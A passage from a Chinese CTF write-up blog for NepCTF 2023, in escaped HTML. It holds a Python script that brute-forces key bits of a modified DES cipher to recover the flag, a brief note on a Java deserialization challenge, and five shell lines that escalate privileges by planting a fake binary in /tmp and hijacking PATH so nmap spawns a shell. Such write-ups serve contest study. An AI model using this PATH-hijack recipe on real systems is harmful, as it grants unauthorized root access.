class=\"number\">1</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">        [<span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">S_box</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    output = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">48</span>, <span class=\"number\">6</span>):</span><br><span class=\"line\">        row = data[i] * <span class=\"number\">2</span> + data[i + <span class=\"number\">5</span>]</span><br><span class=\"line\">        col = reduce(add, [data[i + j] * (<span class=\"number\">2</span> ** (<span class=\"number\">4</span> - j)) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">5</span>)])</span><br><span class=\"line\">        output += [<span class=\"built_in\">int</span>(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">format</span>(__s_box[i // <span class=\"number\">6</span>][row][col], <span class=\"string\">&#x27;04b&#x27;</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], sub_keys: <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    plain = IP(plain)</span><br><span class=\"line\">    L, R = plain[:<span class=\"number\">32</span>], plain[<span class=\"number\">32</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        prev_L = L</span><br><span class=\"line\">        L = R</span><br><span class=\"line\">        expanded_R = EP(R)</span><br><span class=\"line\">        xor_result = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(expanded_R, sub_keys[i])]</span><br><span class=\"line\">        substituted = S_box(xor_result)</span><br><span class=\"line\">        permuted = P(substituted)</span><br><span class=\"line\"></span><br><span class=\"line\">        R = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(permuted, prev_L)]</span><br><span class=\"line\"></span><br><span class=\"line\">    cipher = R + L</span><br><span class=\"line\">    cipher = [cipher[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [<span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>,</span><br><span class=\"line\">                                  <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, <span class=\"number\">62</span>, <span class=\"number\">30</span>,</span><br><span class=\"line\">                                  <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">                                  <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, <span class=\"number\">60</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">                                  <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">                                  <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, <span class=\"number\">58</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">                                  <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>, <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                                  <span class=\"number\">32</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>]]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bitxor</span>(<span class=\"params\">plain1: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], plain2: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span></span><br><span class=\"line\">            <span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plain1), <span class=\"number\">2</span>) ^ <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plain2), <span class=\"number\">2</span>))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">64</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>], sub_keys: <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"comment\"># plain = IP(plain)</span></span><br><span class=\"line\">    L, R = plain[:<span class=\"number\">32</span>], plain[<span class=\"number\">32</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        prev_L = L</span><br><span class=\"line\">        L = R</span><br><span class=\"line\">        expanded_R = EP(R)</span><br><span class=\"line\">        xor_result = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(expanded_R, sub_keys[i])]</span><br><span class=\"line\">        substituted = S_box(xor_result)</span><br><span class=\"line\">        permuted = P(substituted)</span><br><span class=\"line\"></span><br><span class=\"line\">        R = [a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(permuted, prev_L)]</span><br><span class=\"line\"></span><br><span class=\"line\">    cipher = R + L</span><br><span class=\"line\">    <span class=\"comment\"># cipher = [cipher[x] for x in [39, 7, 47, 15, 55, 23, 63, 31,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               38, 6, 46, 14, 54, 22, 62, 30,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               37, 5, 45, 13, 53, 21, 61, 29,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               36, 4, 44, 12, 52, 20, 60, 28,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               35, 3, 43, 11, 51, 19, 59, 27,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               34, 2, 42, 10, 50, 18, 58, 26,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               33, 1, 41, 9, 49, 17, 57, 25,</span></span><br><span class=\"line\">    <span class=\"comment\">#                               32, 0, 40, 8, 48, 16, 56, 24]]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\">P0 = [<span class=\"number\">39</span>, <span class=\"number\">7</span>, <span class=\"number\">47</span>, <span class=\"number\">15</span>, <span class=\"number\">55</span>, <span class=\"number\">23</span>, <span class=\"number\">63</span>, <span class=\"number\">31</span>,</span><br><span class=\"line\">                                  <span class=\"number\">38</span>, <span class=\"number\">6</span>, <span class=\"number\">46</span>, <span class=\"number\">14</span>, <span class=\"number\">54</span>, <span class=\"number\">22</span>, <span class=\"number\">62</span>, <span class=\"number\">30</span>,</span><br><span class=\"line\">                                  <span class=\"number\">37</span>, <span class=\"number\">5</span>, <span class=\"number\">45</span>, <span class=\"number\">13</span>, <span class=\"number\">53</span>, <span class=\"number\">21</span>, <span class=\"number\">61</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">                                  <span class=\"number\">36</span>, <span class=\"number\">4</span>, <span class=\"number\">44</span>, <span class=\"number\">12</span>, <span class=\"number\">52</span>, <span class=\"number\">20</span>, <span class=\"number\">60</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">                                  <span class=\"number\">35</span>, <span class=\"number\">3</span>, <span class=\"number\">43</span>, <span class=\"number\">11</span>, <span class=\"number\">51</span>, <span class=\"number\">19</span>, <span class=\"number\">59</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">                                  <span class=\"number\">34</span>, <span class=\"number\">2</span>, <span class=\"number\">42</span>, <span class=\"number\">10</span>, <span class=\"number\">50</span>, <span class=\"number\">18</span>, <span class=\"number\">58</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">                                  <span class=\"number\">33</span>, <span class=\"number\">1</span>, <span class=\"number\">41</span>, <span class=\"number\">9</span>, <span class=\"number\">49</span>, <span class=\"number\">17</span>, <span class=\"number\">57</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                                  <span class=\"number\">32</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>, <span class=\"number\">8</span>, <span class=\"number\">48</span>, <span class=\"number\">16</span>, <span class=\"number\">56</span>, <span class=\"number\">24</span>]</span><br><span class=\"line\">P0_inv = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(P0)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(P0):</span><br><span class=\"line\">    P0_inv[b] = i</span><br><span class=\"line\"></span><br><span class=\"line\">_IP_inv = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(_IP)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(_IP):</span><br><span class=\"line\">    _IP_inv[b] = i</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">P_set</span>(<span class=\"params\">c, box</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [c[_] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> box]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bin2str</span>(<span class=\"params\">x: []</span>):</span><br><span class=\"line\">    res = <span class=\"built_in\">bytearray</span>()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(x), <span class=\"number\">8</span>):</span><br><span class=\"line\">        res.append(<span class=\"built_in\">int</span>(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, x[i:i+<span class=\"number\">8</span>])), <span class=\"number\">2</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 爆破过程</span></span><br><span class=\"line\"><span class=\"comment\"># check = []</span></span><br><span class=\"line\"><span class=\"comment\"># for test in range(2 ** 9):</span></span><br><span class=\"line\"><span class=\"comment\"># # for test in range(1):</span></span><br><span class=\"line\"><span class=\"comment\">#     LL= [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span></span><br><span class=\"line\"><span class=\"comment\">#     RR= [0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0]</span></span><br><span class=\"line\"><span class=\"comment\">#     LL += list(map(int, bin(test)[2:].ljust(9, &quot;0&quot;)))</span></span><br><span class=\"line\"><span class=\"comment\">#     sub_keys = []</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     t=[0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0]</span></span><br><span class=\"line\"><span class=\"comment\">#     for i in range(16):</span></span><br><span class=\"line\"><span class=\"comment\">#         combined = LL + RR</span></span><br><span class=\"line\"><span class=\"comment\">#         sub_key = PC_2(combined)</span></span><br><span class=\"line\"><span class=\"comment\">#         sub_keys.append(sub_key)</span></span><br><span class=\"line\"><span class=\"comment\">#         for j in range(ROTATIONS[::-1][i]):</span></span><br><span class=\"line\"><span class=\"comment\">#             LL.insert(0, LL.pop(-1))</span></span><br><span class=\"line\"><span class=\"comment\">#             RR.insert(0, RR.pop(-1))</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(LL)</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(RR)</span></span><br><span class=\"line\"><span class=\"comment\">#     # sub_keys = sub_keys[::-1]</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(sub_keys)</span></span><br><span class=\"line\"><span class=\"comment\">#     ct = decrypt(P_set(t[:64], P0_inv), sub_keys)</span></span><br><span class=\"line\"><span class=\"comment\">#     print(test, bin2str(P_set(ct, _IP_inv)))</span></span><br><span class=\"line\"><span class=\"comment\">#     x = bin2str(P_set(ct, _IP_inv))</span></span><br><span class=\"line\"><span class=\"comment\">#     check.append((len(repr(x)), x, test))</span></span><br><span class=\"line\"><span class=\"comment\"># check.sort()</span></span><br><span class=\"line\"><span class=\"comment\"># print(check)</span></span><br><span class=\"line\"><span class=\"comment\"># (22, bytearray(b&#x27;NepCTF&#123;N&#x27;), 503)</span></span><br><span class=\"line\"></span><br><span class=\"line\">LL= [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\">RR= [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">LL += <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, <span class=\"built_in\">bin</span>(<span class=\"number\">503</span>)[<span class=\"number\">2</span>:].ljust(<span class=\"number\">9</span>, <span class=\"string\">&quot;0&quot;</span>)))</span><br><span class=\"line\">sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">t=[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    combined = LL + RR</span><br><span class=\"line\">    sub_key = PC_2(combined)</span><br><span class=\"line\">    sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[::-<span class=\"number\">1</span>][i]):</span><br><span class=\"line\">        LL.insert(<span class=\"number\">0</span>, LL.pop(-<span class=\"number\">1</span>))</span><br><span class=\"line\">        RR.insert(<span class=\"number\">0</span>, RR.pop(-<span class=\"number\">1</span>))</span><br><span class=\"line\">ct = decrypt(P_set(t[:<span class=\"number\">64</span>], P0_inv), sub_keys)</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\">z = raw</span><br><span class=\"line\">keys_t = LL + RR</span><br><span class=\"line\">key = [<span class=\"number\">0</span>] * <span class=\"number\">64</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(__pc1):</span><br><span class=\"line\">    key[b] = keys_t[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(key)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(bin2str(key))</span><br><span class=\"line\">ct = decrypt(P_set(t[<span class=\"number\">64</span>:<span class=\"number\">64</span>*<span class=\"number\">2</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">z = raw</span><br><span class=\"line\">ct = decrypt(P_set(t[<span class=\"number\">64</span>*<span class=\"number\">2</span>:<span class=\"number\">64</span>*<span class=\"number\">3</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"ez-java-checkin\"><a href=\"#ez-java-checkin\" class=\"headerlink\" title=\"ez_java_checkin\"></a>ez_java_checkin</h2><p>简单的java反序列化漏洞，一把梭</p>\n<p><img src=\"/p/2023NepCTF/4bfea74d624d582500046b3938b36a9.png\" alt=\"4bfea74d624d582500046b3938b36a9\"></p>\n<h2 id=\"独步天下-转生成为镜花水月中的王者\"><a href=\"#独步天下-转生成为镜花水月中的王者\" class=\"headerlink\" title=\"独步天下-转生成为镜花水月中的王者\"></a>独步天下-转生成为镜花水月中的王者</h2><p>渗透签到，提示环境变量提权，一把梭</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;/bin/sh&quot;&gt; /tmp/ports-alive</span><br><span class=\"line\">chmod 777 /tmp/ports-alive</span><br><span class=\"line\">export PATH=/tmp:$PATH</span><br><span class=\"line\">nmap -v</span><br><span class=\"line\">cat /flag</span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>纪念一下，打的很爽Pwn抢了4道一血，可惜最后3分钟第一被超了</p>\n<p><img src=\"/p/2023NepCTF/image-20230815163205113.png\" alt=\"image-20230815163205113\"></p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h2 id=\"srop\"><a href=\"#srop\" class=\"headerlink\" title=\"srop\"></a>srop</h2><p>Srop一把梭，这里要注意，跳转是PLT表的syscall函数和真实的系统调用不一样，在函数内会将rdi赋值给rax，后面的参数寄存器都要后移一位</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 